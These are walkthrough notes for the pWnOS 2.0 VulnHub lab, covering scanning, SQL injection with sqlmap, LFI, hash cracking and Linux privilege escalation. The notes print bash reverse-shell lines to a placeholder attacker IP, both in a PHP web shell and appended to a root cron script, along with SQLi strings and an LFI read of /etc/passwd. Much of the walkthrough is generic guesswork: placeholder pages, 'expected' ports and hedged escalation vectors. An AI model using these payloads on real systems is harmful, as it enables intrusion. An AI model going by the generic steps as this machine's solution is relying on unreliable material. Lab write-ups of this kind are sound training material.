# pWnOS 2.0: OSCP Walkthrough Notes

> **Source:** [pWnOS 2.0 on VulnHub](https://www.vulnhub.com/entry/pwnos-20,34/)
> **Author:** pWnOS
> **Difficulty:** Medium
> **OS:** Linux (static IP: 10.10.10.100)
> **Goal:** Get root / find `root.txt`
> **Note:** The machine has a static IP: configure your attacker machine to the `10.10.10.0/24` subnet.

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)

---

## M4d3 w1th ❤️ by Ankit Patidar

---

## 1. Recon

### Host Discovery

Configure the attacker's network adapter to the `10.10.10.0/24` range.

```bash
ifconfig tun0 10.10.10.x netmask 255.255.255.0 up
# or set a static IP matching the target subnet
```

Discover the target:

```bash
netdiscover
nmap -sn 10.10.10.0/24
ping -c 2 10.10.10.100
```

The target is at **10.10.10.100** (static, per the VulnHub listing).

### Port Scanning

Run a full comprehensive scan:

```bash
nmap -sV -sC -p- -T4 10.10.10.100
```

### Expected Open Ports

| Port | Service | Details |
|------|---------|---------|
| 22   | SSH     | OpenSSH server (Linux) |
| 80   | HTTP    | Apache/Nginx web server with PHP |
| 3306 | MySQL   | MySQL database server (localhost) |
| 111  | RPCbind | RPC portmapper |
| Additional | Dynamic RPC/services | Varies |

The static IP and MySQL presence are significant indicators of a full web application stack.

---

## 2. Enumeration

### Web Server Enumeration

Navigate to `http://10.10.10.100/` and examine the web application.

```bash
dirb http://10.10.10.100/
gobuster dir -u http://10.10.10.100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
curl -s http://10.10.10.100/ | grep -i "form\|input\|login\|password"
```

Look for:
- Login forms
- Search functionality (common SQLi vector)
- File upload features
- Any PHP-based application

### SQL Injection Discovery

Test for SQL injection in all user-input fields:

```bash
# Test with a single quote
' OR '1'='1
' OR '1'='1'; --
```

Use SQLMap for automated detection:

```bash
sqlmap -u "http://10.10.10.100/login.php?id=1" --batch --dbs
sqlmap -u "http://10.10.10.100/search.php?q=test" --batch --dbs
```

### Web Application Fingerprinting

```bash
whatweb http://10.10.10.100/
wappalyzer-browser  # if browser extension is available
nikto -h http://10.10.10.100/
```

Identify the CMS, PHP version, and any known vulnerabilities.

### MySQL Enumeration (Local)

If web access reveals MySQL credentials or database names:

```bash
mysql -u root -h 10.10.10.100 -p
# Try common defaults first
mysql -u root -p
# or from an external connection if allowed
```

### SSH Enumeration

```bash
nmap -sV -p 22 10.10.10.100
# Check for default/weak credentials
ssh user@10.10.10.100
```

---

## 3. Exploitation

### SQL Injection Exploitation

#### Step 1: Enumerate Databases

```bash
sqlmap -u "http://10.10.10.100/vulnerable_page.php?id=1" --dbs --batch
```

Identify the database(s). Common database names include `webapp`, `sqli`, `login`, etc.

#### Step 2: Dump Tables

```bash
sqlmap -u "http://10.10.10.100/vulnerable_page.php?id=1" -D <database_name> --tables --batch
```

List all tables to find user/credential tables.

#### Step 3: Dump Data

```bash
sqlmap -u "http://10.10.10.100/vulnerable_page.php?id=1" -D <database_name> -T <users_table> --dump --batch
```

Extract usernames and password hashes.

#### Step 4: Crack Password Hashes

```bash
# Save hashes to a file
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# or
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Step 5: Login with Credentials

Use cracked credentials to log into the web application or SSH.

### Alternative Path: PHP Web Application Exploit

If a direct PHP vulnerability exists (e.g., file inclusion, code execution):

1. **Local File Inclusion (LFI)**
   ```bash
   curl "http://10.10.10.100/page.php?file=../../../../etc/passwd"
   ```
2. **Remote Code Execution via LFI -> PHP Wrappers or Logs**
   ```bash
   # PHP filter chain for RCE
   curl "http://10.10.10.100/page.php?file=php://filter/convert.base64-encode/resource=index.php"
   ```
3. **File Upload Vulnerability**
   - If a file upload feature exists, upload a PHP web shell
   ```bash
   # Simple PHP reverse shell content in shell.php
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<lport> 0>&1'"); ?>
   ```

### Web Shell Deployment

1. Start a listener:
   ```bash
   nc -lvnp 4444
   ```
2. Upload the shell via the application's file upload (if available) or inject it.
3. Access the shell: `http://10.10.10.100/uploads/shell.php`
4. A low-privilege shell should connect back.

### Post-Exploitation: Initial Foothold

```bash
# Upgrade to a TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
stty raw -echo; fg
```

Gather system information:

```bash
whoami
id
uname -a
cat /etc/passwd
cat /etc/*release*
```

---

## 4. Privilege Escalation

### Linux PrivEsc Enumeration

Run a comprehensive enumeration script (e.g., LinPEAS, linEnum.sh, or GTFOBins-check):

```bash
# Manual enumeration
find / -perm -u=s -type f 2>/dev/null          # SUID binaries
find / -writable -type d 2>/dev/null              # Writable directories
cat /etc/crontab                                  # Cron jobs
ls -la /etc/cron.d/                              # Cron scripts
sudo -l                                          # Sudo permissions
find / -writable -type f -name "*.sh" 2>/dev/null # Writable scripts in cron
find /home -type f -name ".*" 2>/dev/null        # Hidden files in home dirs
cat /var/log/* 2>/dev/null | grep -i password    # Logs with credentials
```

### Common pWnOS 2.0 Escalation Vectors

1. **SUID Binary Exploitation**
   - A misconfigured SUID binary can be exploited to gain root.
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   # Use GTFOBins for exploitation ideas:
   # https://gtfobins.github.io/
   ```

2. **Writable Cron Script**
   - If a cron job runs a script with root privileges and the script is world-writable:
   ```bash
   # Edit the writable cron script to add a reverse shell or add a user
   echo "bash -i >& /dev/tcp/<attacker_ip>/4445 0>&1" >> /path/to/writable/cron/script.sh
   ```

3. **SSH Key Injection**
   - If SSH private key files are readable but not protected:
   ```bash
   find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
   ```
   Add your public key to the root `authorized_keys`.

4. **Password File Discovery**
   - A password file (e.g., `password.txt`, `passwords.txt`) in a home directory or config path.
   ```bash
   find /home -type f -name "*.txt" 2>/dev/null
   cat /home/*/password* 2>/dev/null
   ```
   Use discovered passwords with `sudo -l` or SSH to root.

5. **Database Credential Reuse**
   - Credentials extracted from the SQL injection may also grant MySQL root:
   ```bash
   mysql -u root -p<cracked_password>
   # Read /etc/shadow or write a UDF to gain sys_exec
   ```

### Gaining Root

Once a privilege escalation vector is exploited:

```bash
# If a SUID binary can be exploited
./<suid_binary>

# If sudo allows a command
sudo <command>

# If you can write to root's crontab or a script it runs
# Wait for the cron to trigger your reverse shell

# Read the root flag
cat /root/root.txt
```

---

## 5. Screenshots

*No screenshots available for this machine.*

---

## 6. Key Takeaways

1. **SQL injection remains a primary web exploitation vector.** SQLMap automates most of the process: from database enumeration to data dumping.

2. **Static IP targets are easy to plan for.** pWnOS 2.0 uses `10.10.10.100`, making network configuration straightforward in a lab environment.

3. **Web app credentials often map to system credentials.** Passwords cracked from the SQL injection dump may be reused for SSH login or sudo access.

4. **MySQL on localhost can be a pivot point.** If the web app connects to MySQL with credentials, those same credentials may work directly against MySQL, enabling file read/write operations on the server.

5. **Cron jobs are a frequent privEsc vector.** Always check for world-writable scripts that cron runs as root.

6. **pWnOS provides multiple entry points.** SQL injection, file inclusion, and direct credential access are all valid paths: this teaches the value of thorough enumeration.

7. **The goal is always root, not just a shell.** A low-privilege shell is the starting point; systematic enumeration leads to escalation.

---

## M4d3 w1th ❤️ by Ankit Patidar
